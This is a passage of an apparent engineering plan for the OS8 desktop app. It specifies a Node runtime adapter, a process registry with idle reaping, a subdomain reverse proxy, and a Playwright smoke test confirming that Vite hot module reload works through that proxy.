        return [{ argv: ['yarn', 'install', isBerry ? '--immutable' : '--frozen-lockfile', ...flags()] }];
      }
      case 'bun':  return [{ argv: ['bun', 'install', '--frozen-lockfile', ...flags()] }];
      default:     throw new Error(`unsupported package manager: ${pm}`);
    }
  },

  _writeEnvFile(appDir, envEntries) {
    const lines = envEntries.map(e => `${e.name}=${e.value.replace(/\n/g, '\\n')}`);
    fs.writeFileSync(path.join(appDir, '.env'), lines.join('\n') + '\n', 'utf8');
  },

  // ── Start (1.11b) ──────────────────────────────────────────────
  async start(spec, appDir, sanitizedEnv, onLog) {
    for (const cmd of (spec.preStart || [])) {
      await this._spawn(cmd.argv, { cwd: appDir, env: sanitizedEnv, onLog });
    }

    const startArgv = this._substitutePlaceholders(spec.start.argv, {
      APP_HOST:     `${spec._localSlug}.localhost`,
      PORT:         String(sanitizedEnv.PORT),
      APP_DIR:      appDir,
      BLOB_DIR:     sanitizedEnv.OS8_BLOB_DIR,
      OS8_BASE_URL: sanitizedEnv.OS8_BASE_URL,
      OS8_API_BASE: sanitizedEnv.OS8_API_BASE,
    });

    const child = spawn(startArgv[0], startArgv.slice(1), {
      cwd: appDir, env: sanitizedEnv, shell: false,
      stdio: ['ignore', 'pipe', 'pipe'],
      detached: process.platform !== 'win32',   // POSIX: own pgid for tree-kill
    });

    let collected = '';
    child.stdout.on('data', d => { const s = d.toString(); collected += s; onLog?.('stdout', s); });
    child.stderr.on('data', d => { const s = d.toString(); collected += s; onLog?.('stderr', s); });
    child.on('exit', code => onLog?.('exit', `process exited code=${code}`));

    const ready = this._waitReady(spec, child, () => collected, sanitizedEnv);

    return {
      pid: child.pid,
      port: parseInt(sanitizedEnv.PORT, 10),
      ready,
      _child: child,    // private — used by stop()
    };
  },

  async _waitReady(spec, child, getCollected, env) {
    const probe = spec.start.readiness || { type: 'http', path: '/' };
    const timeoutMs = (probe.timeout_seconds ?? 30) * 1000;
    const deadline = Date.now() + timeoutMs;

    if (probe.type === 'http') {
      const url = `http://127.0.0.1:${env.PORT}${probe.path || '/'}`;
      while (Date.now() < deadline) {
        if (child.exitCode !== null) throw new Error(`process exited before ready code=${child.exitCode}`);
        try {
          const r = await fetch(url, { signal: AbortSignal.timeout(1000) });
          if (r.status >= 200 && r.status < 500) return;
        } catch {}
        await sleep(250);
      }
      throw new Error(`readiness http timeout: ${url}`);
    }

    if (probe.type === 'log-regex') {
      const re = new RegExp(probe.regex);
      while (Date.now() < deadline) {
        if (child.exitCode !== null) throw new Error('process exited before ready');
        if (re.test(getCollected())) return;
        await sleep(100);
      }
      throw new Error(`readiness log-regex timeout: /${probe.regex}/`);
    }
    throw new Error(`unknown readiness type: ${probe.type}`);
  },

  // ── Stop (1.11b) ───────────────────────────────────────────────
  async stop(processInfo) {
    const pid = processInfo?._child?.pid || processInfo?.pid;
    if (!pid) return;
    return new Promise((resolve) => {
      treeKill(pid, 'SIGTERM', (err) => {
        if (err) setTimeout(() => treeKill(pid, 'SIGKILL', () => resolve()), 5000);
        else resolve();
      });
    });
  },

  // ── Watcher (1.11b) ────────────────────────────────────────────
  watchFiles(spec, appDir, onChange) {
    const chokidar = require('chokidar');
    const paths = (spec.dev?.watch && spec.dev.watch.length > 0)
      ? spec.dev.watch.map(p => path.join(appDir, p))
      : [path.join(appDir, 'src'), path.join(appDir, 'public')].filter(fs.existsSync);
    // ignored: a function that consults parsed .gitignore + node_modules + .env*.
    const watcher = chokidar.watch(paths, {
      ignored: makeGitignoreFilter(appDir),
      ignoreInitial: true,
    });
    watcher.on('all', (event, file) => onChange({ event, file }));
    return () => watcher.close();
  },

  async detectVersion(spec, appDir) {
    return runCmd('git', ['-C', appDir, 'rev-parse', 'HEAD'], { timeout: 5000 }).then(s => s.trim());
  },

  // ── Internals ──────────────────────────────────────────────────
  async _spawn(argv, { cwd, env, onLog }) {
    return new Promise((resolve, reject) => {
      const p = spawn(argv[0], argv.slice(1), { cwd, env, shell: false,
        stdio: ['ignore', 'pipe', 'pipe'] });
      p.stdout.on('data', d => onLog?.('stdout', d.toString()));
      p.stderr.on('data', d => onLog?.('stderr', d.toString()));
      p.on('error', reject);
      p.on('exit', code => code === 0 ? resolve() : reject(new Error(`${argv[0]} exited ${code}`)));
    });
  },

  _substitutePlaceholders(argv, vars) {
    return argv.map(a => a.replace(/\{\{([A-Z_]+)\}\}/g, (m, name) => vars[name] ?? m));
  },
};

function runCmd(cmd, args, { timeout } = {}) { /* spawn → resolve stdout */ }
function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }
function makeGitignoreFilter(appDir) { /* parse .gitignore; return matcher */ }

module.exports = NodeRuntimeAdapter;
```

### Framework defaults table (when manifest fields are absent)

The adapter applies these *only when the manifest's field is empty*. Manifest values always win.

All v1 frameworks bind at `/` because v1 routes every external app at its own subdomain (`<slug>.localhost:8888`). No base-path flag, no per-framework config patch.

| Framework | `start.argv` injection (when manifest only sets `["npm", "run", "dev"]`) | Readiness | HMR |
|---|---|---|---|
| `vite` | append `["--", "--port", "{{PORT}}", "--host", "127.0.0.1"]` | http GET `/` | vite |
| `nextjs` | append `["--port", "{{PORT}}", "--hostname", "127.0.0.1"]` | http GET `/` | next |
| `sveltekit` | append `["--", "--port", "{{PORT}}", "--host", "127.0.0.1"]` | http GET `/` | watcher (SvelteKit's HMR via Vite) |
| `astro` | append `["--", "--port", "{{PORT}}", "--host", "127.0.0.1"]` | http GET `/` | watcher |
| `none` | none — manifest's argv is canonical | manifest | none |

**Note on Vite `allowedHosts`.** Vite ≥4.5 by default allows `localhost`, `127.0.0.1`, and same-origin hosts. For `<slug>.localhost`, this works out of the box. If a future Vite version tightens the default, the `framework: vite` adapter injects `--allowedHosts=.localhost` (the leading-dot wildcard form). Verified at PR 1.14 smoke time.

**Note on Next.js.** Next.js binds at `/` cleanly with no `basePath` config. Manifest authors no longer need to ship a config patch for path-prefix support — a major catalog-friendliness win.

### `--ignore-scripts` policy table (plan §10 decision 8)

```
review.channel       allow_package_scripts (manifest)        Effective scripts
─────────────────    ──────────────────────────────────      ─────────────────
verified             (ignored — always allow)                 allowed
community            true                                     allowed
community            false (default)                          --ignore-scripts
developer-import     (ignored — always block)                 --ignore-scripts
```

Implemented in `_frozenInstallCmds`.

### Tree-kill behavior

- **POSIX (macOS/Linux):** `treeKill(pid, 'SIGTERM')` reads the process group via `ps -o pgid=` and signals the whole group. `detached: true` at spawn ensures the child gets its own pgid; Vite's child node processes (esbuild, etc.) die with the parent.
- **Windows:** `treeKill` shells out to `taskkill /pid <pid> /T /F`. `/T` walks the tree; `/F` forces. `detached: false` on Windows since pgid semantics don't apply.

### Tests

`tests/runtime-adapters/node.test.js` (1.11a):

| Fixture | Assertion |
|---|---|
| `tests/fixtures/vite-app/` (PR 1.14 fixture) | `detectPackageManager` returns `'npm'` |
| Add `pnpm-lock.yaml` to that dir | returns `'pnpm'` |
| Both `pnpm-lock.yaml` and `package-lock.json` present | returns `'pnpm'` (precedence) |
| `.yarnrc.yml` + `yarn.lock` | returns `'yarn'`; install cmd is `yarn install --immutable` |
| Channel `community`, `allow_package_scripts: false` | install cmd includes `--ignore-scripts` |
| Channel `verified` | install cmd does NOT include `--ignore-scripts` |
| Channel `developer-import`, `allow_package_scripts: true` | install cmd STILL includes `--ignore-scripts` |

`tests/runtime-adapters/node-start.test.js` (1.11b):

| Fixture | Assertion |
|---|---|
| Worldmonitor-style fixture, `npm run dev` | `start` returns `{ pid, port, ready }`; `ready` resolves; `fetch http://127.0.0.1:port/` 200 |
| Mid-run kill | `stop` returns; child + grandchildren dead (verified via `ps` post-call) |
| log-regex `regex: 'ready in [0-9]+ ms'` | resolves on Vite's stderr |
| Crash before listen | `ready` rejects "process exited before ready" |

### Acceptance criteria

- Adapter installs the worldmonitor fixture (frozen) in <60s on a warm npm cache; `start` resolves <30s after spawn.
- `stop()` reliably kills the dev server + all child processes on macOS, Linux, Windows.

### Cross-platform notes

- **Windows:** `tree-kill` shells out to `taskkill`. Confirm `taskkill.exe` is on `process.env.PATH` (default since XP).
- **POSIX:** `detached: true` is mandatory for tree-kill — children inherit a fresh pgid.

### Spec deviations

- **Yarn berry vs yarn1 detection** via `.yarnrc.yml` rather than separate manifest values. Plan §10 decision 7.

### Depends on

PR 1.10. 1.11b depends on 1.11a.

### Open sub-questions

None.

---

## PR 1.12 — `AppProcessRegistry` (multi-signal idle reaping)

**Goal.** Lifecycle registry for external app processes. Random port allocation in `[40000, 49999]` with EADDRINUSE reroll. Multi-signal idle detection (HTTP + stdout + child). Per-app `keepRunning` override. `stopAll()` on app quit.

### Files

- **Create:** `/home/leo/Claude/os8/src/services/app-process-registry.js`
- **Modify:** `/home/leo/Claude/os8/main.js` — initialize at startup; `window-all-closed` handler (line 395) calls `stopAll()`

### Module shape

```js
const net = require('node:net');
const path = require('node:path');
const yaml = require('js-yaml');
const { getAdapter } = require('./runtime-adapters');
const { buildSanitizedEnv } = require('./sanitized-env');
const AppService = require('./app');
const { APPS_DIR } = require('../config');

const PORT_MIN = 40000, PORT_MAX = 49999, PORT_REROLL_MAX = 5;
const DEFAULT_IDLE_MS = 30 * 60 * 1000;     // 30 min default (plan §10 Q3)

class AppProcessRegistry {
  constructor({ db, getOS8Port }) {
    this.db = db; this.getOS8Port = getOS8Port;
    this._processes = new Map();
    this._reaperTimer = null;
    this.idleMs = DEFAULT_IDLE_MS;
  }
  setIdleTimeout(ms) { this.idleMs = ms; }

  async start(appId, { devMode = false, onProgress } = {}) {
    if (this._processes.has(appId)) return this._processes.get(appId);
    const app = AppService.getById(this.db, appId);
    if (!app || app.app_type !== 'external') throw new Error('not an external app');

    const manifest = yaml.load(app.manifest_yaml || '');
    const adapter  = getAdapter(manifest.runtime.kind);
    const port     = await this._allocatePort();
    const env      = buildSanitizedEnv(this.db, {
      appId, allocatedPort: port, manifestEnv: manifest.env || [],
      localSlug: app.slug, OS8_PORT: this.getOS8Port(),
    });
    const appDir = path.join(APPS_DIR, appId);
    manifest._localSlug = app.slug;

    const onLog = (stream, chunk) => {
      this.markStdoutActive(appId);
      if (/child .* spawned|fork .* spawned/i.test(chunk)) this.markChildActive(appId);
      onProgress?.({ kind: 'log', stream, chunk });
    };

    const info = await adapter.start(manifest, appDir, env, onLog);

    const r = {
      appId, pid: info.pid, port, status: 'starting',
      startedAt: Date.now(),
      lastHttpAt: Date.now(), lastStdoutAt: Date.now(), lastChildAt: Date.now(),
      devMode, keepRunning: false,
      _adapterInfo: info, _watcherDispose: null,
    };
    this._processes.set(appId, r);

    try {
      await info.ready;
      r.status = 'running';
    } catch (err) {
      r.status = 'failed';
      this._processes.delete(appId);
      try { await adapter.stop(info); } catch {}
      throw err;
    }

    if (devMode) {
      r._watcherDispose = adapter.watchFiles(manifest, appDir,
        () => onProgress?.({ kind: 'change' }));
    }
    if (!this._reaperTimer) this._startReaper();
    return r;
  }

  async stop(appId, { reason = 'manual' } = {}) {
    const r = this._processes.get(appId);
    if (!r) return;
    r._watcherDispose?.();
    try { await getAdapter('node').stop(r._adapterInfo); }
    catch (e) { console.warn('[AppProcessRegistry] stop:', e.message); }
    r.status = 'stopped';
    this._processes.delete(appId);
  }

  get(appId)  { return this._processes.get(appId) || null; }
  getAll()    { return Array.from(this._processes.values()); }

  markHttpActive(appId)   { const r = this._processes.get(appId); if (r) r.lastHttpAt   = Date.now(); }
  markStdoutActive(appId) { const r = this._processes.get(appId); if (r) r.lastStdoutAt = Date.now(); }
  markChildActive(appId)  { const r = this._processes.get(appId); if (r) r.lastChildAt  = Date.now(); }
  setKeepRunning(appId, v){ const r = this._processes.get(appId); if (r) r.keepRunning  = !!v; }

  reapIdle() {
    const now = Date.now();
    for (const r of this._processes.values()) {
      if (r.keepRunning) continue;
      const idleAll =
        (now - r.lastHttpAt   > this.idleMs) &&
        (now - r.lastStdoutAt > this.idleMs) &&
        (now - r.lastChildAt  > this.idleMs);
      if (idleAll) {
        console.log(`[AppProcessRegistry] reaping ${r.appId}`);
        this.stop(r.appId, { reason: 'idle' }).catch(() => {});
      }
    }
  }

  async stopAll() {
    const ids = [...this._processes.keys()];
    await Promise.allSettled(ids.map(id => this.stop(id, { reason: 'shutdown' })));
    if (this._reaperTimer) clearInterval(this._reaperTimer);
  }

  _startReaper() {
    this._reaperTimer = setInterval(() => this.reapIdle(), 5 * 60 * 1000);
    this._reaperTimer.unref?.();
  }

  async _allocatePort() {
    for (let i = 0; i < PORT_REROLL_MAX; i++) {
      const p = PORT_MIN + Math.floor(Math.random() * (PORT_MAX - PORT_MIN + 1));
      if (await this._isFree(p)) return p;
    }
    return await this._osAllocate();
  }
  _isFree(port) {
    return new Promise(resolve => {
      const s = net.createServer();
      s.unref?.();
      s.once('error', () => resolve(false));
      s.listen(port, '127.0.0.1', () => s.close(() => resolve(true)));
    });
  }
  _osAllocate() {
    return new Promise(resolve => {
      const s = net.createServer();
      s.listen(0, '127.0.0.1', () => {
        const port = s.address().port;
        s.close(() => resolve(port));
      });
    });
  }
}

let _instance = null;
module.exports = {
  init({ db, getOS8Port }) { _instance = new AppProcessRegistry({ db, getOS8Port }); return _instance; },
  get() { if (!_instance) throw new Error('AppProcessRegistry not initialized'); return _instance; },
};
```

### Activity wiring

- **HTTP:** `ReverseProxyService.middleware()` (PR 1.13) calls `markHttpActive(appId)` on every proxied request. Looked up via the registered proxy entry's `appId`.
- **stdout/stderr:** adapter's `onLog` callback (PR 1.11) pings `markStdoutActive`. Wired in `start` above.
- **child:** regex on `onLog` chunks for "child … spawned" / "fork … spawned" patterns (heuristic). A `ps`-poll fallback (every 30s, count children) is a follow-up.

### `main.js` changes

In `app.whenReady()` after `startServer(null, db)` (around line 320):

```js
const APR = require('./src/services/app-process-registry');
APR.init({ db, getOS8Port: getPort });
```

In `window-all-closed` (line 395-420), AFTER `JobSchedulerService.stop()` and BEFORE `await stopServer()`:

```js
try {
  const reg = require('./src/services/app-process-registry').get();
  await reg.stopAll();
} catch {}
```

### Tests

`tests/app-process-registry.test.js`:

| Setup | Assertion |
|---|---|
| `_allocatePort` × 1000 | all values in `[40000, 49999]` |
| `_isFree` always returns false | falls back to OS-assigned (port outside the range) |
| Start, `markHttpActive` every 1s (mocked time) | not reaped after 31 min |
| Start, no signals | reaped after 31 min |
| Start with `setKeepRunning(true)` | NOT reaped |
| `stopAll` after 3 starts | all 3 stopped; map empty |

### Acceptance criteria

- Worldmonitor process starts; `get(appId)` returns `{ status: 'running', pid, port }`.
- Sending traffic via the proxy keeps `lastHttpAt` fresh; idle timer doesn't fire.
- `Cmd+Q` (or `app.quit`) kills all running externals within 5s.

### Cross-platform notes

- Port checks via `net.createServer().listen(p, '127.0.0.1')` work identically on macOS / Linux / Windows.
- `setInterval.unref()` is a no-op on Windows but the call pattern is portable.

### Spec deviations

None.

### Depends on

PR 1.11 (adapter), PR 1.10 (env). Activity wiring is a soft dep on PR 1.13 (proxy middleware) — middleware swallows the missing-registry case via `try`/`catch`.

### Open sub-questions

None.

---

## PR 1.13 — `ReverseProxyService` primitive (HTTP + WebSocket upgrade, subdomain-only)

**Goal.** Stand up the reverse-proxy primitive PR 1.14 depends on. Subdomain-only routing: match `Host: <slug>.localhost:8888`, proxy to upstream port. Path mode is rejected at the architecture level; this primitive doesn't ship one. **No mounting in `server.js` yet** — that's PR 1.15.

### Files

- **Create:** `/home/leo/Claude/os8/src/services/reverse-proxy.js`
- **Modify:** `/home/leo/Claude/os8/package.json` — add `http-proxy@^1.18.1` to `dependencies`

### Module shape

```js
const httpProxy = require('http-proxy');

// changeOrigin: false preserves Host header so the upstream sees
// `<slug>.localhost:8888`. Most modern frameworks accept this without
// allowedHosts config; if a future Vite version tightens, the adapter
// injects --allowedHosts=.localhost (PR 1.11).
// xfwd: true sets X-Forwarded-* so the upstream knows it's behind a proxy.
const proxy = httpProxy.createProxyServer({ ws: true, xfwd: true, changeOrigin: false });

// Surface upstream errors as 502 — don't crash the OS8 server.
proxy.on('error', (err, req, res) => {
  console.warn('[ReverseProxy] upstream error:', err.message);
  if (res && !res.headersSent && typeof res.writeHead === 'function') {
    res.writeHead(502, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ error: 'upstream unavailable', detail: err.message }));
  }
});

const _proxies = new Map();    // localSlug → { appId, port }

const SUBDOMAIN_HOST_RE = /^([a-z][a-z0-9-]{1,39})\.localhost(?::\d+)?$/;

const ReverseProxyService = {
  register(localSlug, appId, port) {
    _proxies.set(localSlug, { appId, port });
  },
  unregister(localSlug) { _proxies.delete(localSlug); },
  getPort(localSlug)    { return _proxies.get(localSlug)?.port ?? null; },
  has(localSlug)        { return _proxies.has(localSlug); },

  middleware() {
    return (req, res, next) => {
      const entry = ReverseProxyService._resolveByHost(req);
      if (!entry) return next();
      try { require('./app-process-registry').get().markHttpActive(entry.appId); }
      catch {}
      // Pass req.url through unchanged — framework binds at / on its own port,
      // and the upstream sees the original path.
      proxy.web(req, res, { target: `http://127.0.0.1:${entry.port}` });
    };
  },

  // CRITICAL — wires server.on('upgrade') for WebSocket HMR.
  attachUpgradeHandler(server) {
    server.on('upgrade', (req, socket, head) => {
      const entry = ReverseProxyService._resolveByHost(req);
      if (!entry) { socket.destroy(); return; }
      try { require('./app-process-registry').get().markHttpActive(entry.appId); }
      catch {}
      proxy.ws(req, socket, head, { target: `http://127.0.0.1:${entry.port}` });
    });
  },

  _resolveByHost(req) {
    const host = (req.headers.host || '').toLowerCase();
    const m = host.match(SUBDOMAIN_HOST_RE);
    if (!m) return null;
    return _proxies.get(m[1]) || null;
  },
};

module.exports = ReverseProxyService;
```

### Tests

`tests/reverse-proxy.test.js`:

| Setup | Assertion |
|---|---|
| `register('foo', 'app-1', 12345)`; `getPort('foo')` | 12345 |
| `register` + `unregister` | `getPort('foo') === null` |
| `_resolveByHost` with `Host: foo.localhost:8888` (registered) | returns entry |
| `_resolveByHost` with `Host: localhost:8888` (no subdomain) | null |
| `_resolveByHost` with `Host: unknown.localhost:8888` (not registered) | null |
| `middleware()` for unmatched host | calls `next()` |
| `middleware()` for matched + dead upstream | 502 |
| `attachUpgradeHandler` + WebSocket with subdomain Host | WS upgrade succeeds; frames pass through |

End-to-end with HMR: covered by PR 1.14.

### Acceptance criteria

- Unit tests pass.
- Mounted on a test Express + a real Vite app, `curl -H 'Host: foo.localhost:<port>' http://localhost:<port>/` returns Vite's index.
- A WebSocket upgrade request with subdomain Host succeeds and frames pass through.
- Native traffic on bare `localhost:8888/...` falls through unchanged via `next()`.

### Cross-platform notes

`http-proxy@1.18.1` is platform-agnostic. RFC 6761 `*.localhost` resolution is verified at install time (PR 1.16 pre-flight DNS check), not in this primitive.

### Spec deviations

None — matches updated spec §6.2.3 (subdomain-only).

### Depends on

None — primitive. Soft dep on PR 1.12 (idle reaping) handled via `try`/`catch`.

### Open sub-questions

None.

---

## PR 1.14 — **GATING** Vite HMR smoke test through subdomain reverse proxy

**Goal.** Prove that the subdomain reverse-proxy strategy carries Vite HMR end-to-end before any downstream work merges: spin up a real Vite project on a random port, mount `ReverseProxyService` (PR 1.13) on a test Express server, drive a headless browser to `<slug>.localhost:<test_port>/`, edit a `.tsx` file, assert the page updates **without a full reload** (HMR succeeded). Subdomain WS proxying is well-trodden in production tooling (StackBlitz, Coder, GitPod) so the risk is low — but the test still gates 1.15/1.16/1.19 to catch any subtle Vite config issue (e.g. `server.hmr.clientPort`, `allowedHosts`) before downstream work locks in.

### Files

- **Create:** `/home/leo/Claude/os8/tests/e2e/vite-hmr-smoke.test.js`
- **Create:** `/home/leo/Claude/os8/tests/fixtures/vite-app/` — minimal Vite + React project (see "Fixture" below)
- **Modify:** `/home/leo/Claude/os8/package.json` — add `playwright@^1.49` to `devDependencies`. (Reasoning under "Harness choice.")

### Fixture

`tests/fixtures/vite-app/` is a deterministic, lock-pinned Vite + React project. Versions chosen to match the realistic upstream we ship in catalog: `vite@5` (worldmonitor), `react@18`. Pinned versions prevent flake from upstream patch bumps.

```
tests/fixtures/vite-app/
├── package.json
├── package-lock.json        # committed; npm ci is required for determinism
├── vite.config.js
├── index.html
└── src/
    ├── main.jsx
    └── App.jsx
```

`package.json`:

```json
{
  "name": "vite-app-fixture",
  "private": true,
  "version": "0.0.0",
  "type": "module",
  "scripts": {
    "dev": "vite"
  },
  "dependencies": {
    "react": "18.3.1",
    "react-dom": "18.3.1"
  },
  "devDependencies": {
    "@vitejs/plugin-react": "4.3.4",
    "vite": "5.4.11"
  }
}
```

`vite.config.js`:

```js
import { defineConfig } from 'vite';
import react from '@vitejs/plugin-react';

export default defineConfig({
  plugins: [react()],
  server: {
    host: '127.0.0.1',
    // port allocated by the test (passed via --port).
    // App binds at /. Subdomain routing happens at the proxy.
    // allowedHosts: '.localhost' matches Vite ≥4.5 default; explicit for clarity.
    allowedHosts: ['.localhost'],
  }
});
```

`index.html`:

```html
<!doctype html>
<html><body>
  <div id="root"></div>
  <script type="module" src="/src/main.jsx"></script>
</body></html>
```

`src/main.jsx`:

```jsx
import { createRoot } from 'react-dom/client';
import App from './App.jsx';
createRoot(document.getElementById('root')).render(<App />);
```

`src/App.jsx`:

```jsx
export default function App() {
  return <h1 data-testid="hmr-marker">SMOKE_TEST_INITIAL</h1>;
}
```

### Harness choice — Playwright (not Puppeteer)

Reasons, in order:

1. **Network monitoring API.** Playwright's `page.on('framenavigated')` and `page.on('request')` reliably distinguish a full reload from an HMR patch. Puppeteer's equivalent surface has been historically less stable across Chromium versions, especially around module-script reloads.
2. **Bundle WebSocket inspection.** HMR runs over a WebSocket from `vite-client` to the Vite dev server. Playwright exposes `page.on('websocket')` with frame-level inspection — useful for diagnosing failure modes (was the WS opened? did the server send the patch frame?).
3. **CI matrix already plausible.** Playwright's `@playwright/test` runner supports the `[macos-14, ubuntu-22.04]` matrix locked in plan §10 Q12 with a single config.
4. **Already a soft-precedent in the OS8 ecosystem.** os8.ai's PR 0.9 test plan also calls for Playwright. Aligning desktop and website on one tool reduces local-setup friction for engineers cross-tasking.

Alternatives considered: Puppeteer (rejected as above), `electron`'s built-in test harness via `_electron` API (rejected — overkill for this test, which doesn't need Electron at all). The smoke test runs against a plain Node + Express + Vite stack; the BrowserView wraps come later in PR 1.19.

### Test outline

```js
// /home/leo/Claude/os8/tests/e2e/vite-hmr-smoke.test.js
import { test, expect, chromium } from '@playwright/test';
import { spawn } from 'node:child_process';
import express from 'express';
import { promisify } from 'node:util';
import { execFile as execFileCb } from 'node:child_process';
import fs from 'node:fs';
import path from 'node:path';

const execFile = promisify(execFileCb);
const FIXTURE_DIR = path.resolve(__dirname, '../fixtures/vite-app');
const SLUG = 'smoke';

test('Vite HMR survives subdomain reverse proxy', async () => {
  // 1. Frozen install of the fixture (idempotent — npm ci skips if up-to-date).
  await execFile('npm', ['ci', '--prefix', FIXTURE_DIR], { timeout: 90_000 });

  // 2. Allocate two random ports.
  const proxyPort = await freePort();   // OS8 server port (Express + proxy)
  const viteAppPort = await freePort(); // upstream Vite

  // 3. Spawn Vite. Binds at /, no --base flag. Routing happens at the proxy.
  const vite = spawn('npx', ['vite', '--port', String(viteAppPort),
                             '--host', '127.0.0.1'],
    { cwd: FIXTURE_DIR, env: { ...process.env, FORCE_COLOR: '0' } });
  await waitForHttp(`http://127.0.0.1:${viteAppPort}/`, 30_000);

  // 4. Build the test Express + ReverseProxyService.
  const ReverseProxyService = require('../../src/services/reverse-proxy');
  ReverseProxyService.register(SLUG, /* appId */ 'smoke-app', viteAppPort);

  const app = express();
  app.use(ReverseProxyService.middleware());
  const server = app.listen(proxyPort);
  ReverseProxyService.attachUpgradeHandler(server);

  try {
    // 5. Drive Playwright.
    const browser = await chromium.launch();
    const ctx = await browser.newContext();
    const page = await ctx.newPage();

    // Track full navigations vs same-document updates.
    let frameNavigations = 0;
    page.on('framenavigated', frame => {
      if (frame === page.mainFrame()) frameNavigations++;
    });
    let websocketsSeen = 0;
    page.on('websocket', () => websocketsSeen++);

    // Navigate via the subdomain — RFC 6761 resolves *.localhost to 127.0.0.1.
    await page.goto(`http://${SLUG}.localhost:${proxyPort}/`, { waitUntil: 'networkidle' });
    expect(await page.getByTestId('hmr-marker').textContent()).toBe('SMOKE_TEST_INITIAL');
    const initialNavCount = frameNavigations;
    expect(websocketsSeen).toBeGreaterThanOrEqual(1);   // HMR WS opened through proxy

    // 6. Edit App.jsx — change the marker text. Vite watches src/, no manifest change.
    const appPath = path.join(FIXTURE_DIR, 'src', 'App.jsx');
    const original = fs.readFileSync(appPath, 'utf8');
    try {
      fs.writeFileSync(appPath, original.replace('SMOKE_TEST_INITIAL', 'SMOKE_TEST_PATCHED'));

      // 7. Wait for HMR to apply. Polling because HMR is async.
      await expect.poll(
        async () => page.getByTestId('hmr-marker').textContent(),
        { timeout: 10_000, intervals: [200, 500, 1000] }
      ).toBe('SMOKE_TEST_PATCHED');

      // 8. CRITICAL ASSERTION: no full navigation occurred.
      // HMR patches the module without unloading the document.
      expect(frameNavigations).toBe(initialNavCount);
    } finally {
      fs.writeFileSync(appPath, original);   // restore
    }

    await browser.close();
  } finally {
    server.close();
    vite.kill('SIGTERM');
    setTimeout(() => vite.kill('SIGKILL'), 5000).unref();
  }
}, { timeout: 180_000 });
```

(Helpers `freePort` and `waitForHttp` are 10-line utilities in the same file or in `tests/helpers/`; standard Node `net.Server.listen(0)` for `freePort`, polling `fetch` for `waitForHttp`.)

### What "passes" means observably

The test passes iff **all four** signals fire in order:

1. **`page.goto` succeeds** with a 200 — `<slug>.localhost` resolves to `127.0.0.1`, the proxy matches the Host, forwards to Vite.
2. **At least one WebSocket is opened** by the page — `page.on('websocket')` fires, confirming the proxy passes WS upgrades through.
3. **Edit-then-poll converges** — the new marker text appears within 10s.
4. **Full-frame navigation count is unchanged** between baseline and post-edit. This is the assertion that *distinguishes HMR from a full reload*. A failed HMR fallback that calls `location.reload()` would bump `frameNavigations` by 1; HMR proper does not.

### Failure-mode definitions

| Symptom | Diagnosis | Fix |
|---|---|---|
| `page.goto` errors with `ERR_NAME_NOT_RESOLVED` (Linux CI in particular) | The CI environment doesn't resolve `*.localhost` natively. | Fix the harness: pre-write `127.0.0.1 smoke.localhost` to `/etc/hosts` in CI setup. (Modern Ubuntu CI images and macOS resolve natively; this is mainly an old-distro thing.) |
| WebSocket count is 0 | Proxy is not passing the `Upgrade: websocket` header through. `attachUpgradeHandler` is missing or wrong. | **HARD FAIL.** Fix PR 1.13. |
| WebSocket connects but page text never changes | HMR WS frames aren't reaching the client. Possible causes: Vite's HMR client thinks it's at the upstream port (need `server.hmr.clientPort = <proxyPort>`); `Host` rewriting bug (`changeOrigin` should stay `false`); proxy dropping `Sec-WebSocket-Protocol`. | **HARD FAIL.** Diagnose via Vite stderr (`[hmr] failed` lines) and Playwright's `page.on('websocket', ws => ws.on('framereceived'))` to inspect frames. Adjust Vite config or proxy `changeOrigin` setting; rerun. |
| Page text changes BUT `frameNavigations` bumped | Vite's HMR fallback fired (full reload). HMR is technically "working" but degraded. | **SOFT FAIL.** Investigate root cause (typically a transformer issue, e.g. mixing CSS modules with non-module imports). Don't ship until resolved. |
| Test passes locally but flakes in CI | Timing or port-allocation race. | **NOT A SMOKE-TEST FAILURE** — fix the harness (longer timeouts, retry on port allocation). |

### Hard-fail recovery (architecture-level)

If after diligent diagnosis the smoke test can't pass — Vite-through-`http-proxy.ws` simply can't carry HMR for this proxy library — the implementation library changes, not the architecture. Subdomain proxying is a well-understood pattern; HMR-over-WS-through-proxy is exactly what production tools like StackBlitz, Coder, and GitPod do every day. Candidates if `http-proxy@1.18` proves unreliable:

- **`@fastify/http-proxy`** — newer codebase, actively maintained.
- **`http-proxy-middleware`** — wraps `http-proxy` with Express affordances; same kernel but different config surface.
- **A 60-line custom `http`-module proxy** — for a single same-port subdomain rewrite, this is genuinely tractable.

The architecture (subdomain routing, scoped API on subdomain, hardened BrowserView, atomic install pipeline) is unchanged. Only PR 1.13's library choice would need to flip.

### Acceptance criteria

- `npm test -- vite-hmr-smoke` passes locally on macOS and Linux. CI (matrix `[macos-14, ubuntu-22.04]`) is green.
- The test runs in <90s end-to-end (npm ci is the largest factor, cached after first run).
- The fixture's `package-lock.json` is committed; `npm ci` succeeds offline if `~/.npm/_cacache` is warm.

### Cross-platform notes

- **macOS / Linux:** blocking. `*.localhost` resolves to `127.0.0.1` natively per RFC 6761.
- **Windows:** informational-only on `windows-2022` per plan §10 Q12. Win11 modern builds resolve `*.localhost` natively; legacy/AV-restricted builds may not. The hosts-entry fallback that PR 1.16 implements at install time covers Windows users in production.
- **CI gotcha:** some legacy Ubuntu CI images don't ship the `nss-myhostname` resolver. Modern `ubuntu-22.04` and `ubuntu-24.04` images do. If a workflow lands on an older image, add `echo '127.0.0.1 smoke.localhost' | sudo tee -a /etc/hosts` to the setup step.

### Depends on

PR 1.13 (`ReverseProxyService` primitive must exist).

### Spec deviations

None — this PR specifies the gating fixture rather than deviating from anything.

### Open sub-questions

None.

---

## PR 1.15 — Mount middleware in `src/server.js`

**GATED behind PR 1.14.** Do not merge until 1.14 passes locally on macOS + Linux.

**Goal.** Splice `scopedApiMiddleware` and `ReverseProxyService.middleware()` into the Express stack ahead of the catch-all. Wire `attachUpgradeHandler` at server startup.

### Files

- **Modify:** `/home/leo/Claude/os8/src/server.js`

### Splice points (verified from audit, line numbers exact at audit time)

```js
// (a) After Vite middleware mount (line 669) and BEFORE catch-all (line 682):
//     The exact insertion is at line 680 (between the two).

const ReverseProxyService = require('./services/reverse-proxy');
const { scopedApiMiddleware } = require('./services/scoped-api-surface');

app.use(scopedApiMiddleware(db));               // <slug>.localhost:8888/_os8/api/* → /api/* with app context
app.use(ReverseProxyService.middleware());      // /<slug>/* and *.localhost:8888 → upstream

